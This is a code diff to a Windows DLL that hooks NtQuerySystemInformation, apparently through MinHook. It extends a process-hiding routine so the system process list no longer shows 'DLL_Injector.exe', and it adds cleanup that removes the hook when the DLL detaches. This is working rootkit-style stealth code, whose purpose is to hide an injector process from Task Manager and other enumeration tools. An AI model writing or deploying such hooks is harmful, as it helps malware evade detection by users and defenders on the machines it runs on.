@@ -35,6 +35,15 @@ NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
 				}
 				curr = prev;
 			}
+			if (!lstrcmp(curr->ImageName.Buffer, L"DLL_Injector.exe")) {
+				if (curr->NextEntryOffset == 0) {
+					prev->NextEntryOffset = 0;
+				}
+				else {
+					prev->NextEntryOffset += curr->NextEntryOffset;
+				}
+				curr = prev;
+			}
 			prev = curr;
 			curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
 		}
@@ -74,6 +83,10 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 			return FALSE;
 		}
 		get_process_name();
+		break;
+	case DLL_PROCESS_DETACH:
+		MH_DisableHook(Original_NtQuerySystemInformation);
+		MH_Uninitialize();
 		break;
 	}
 
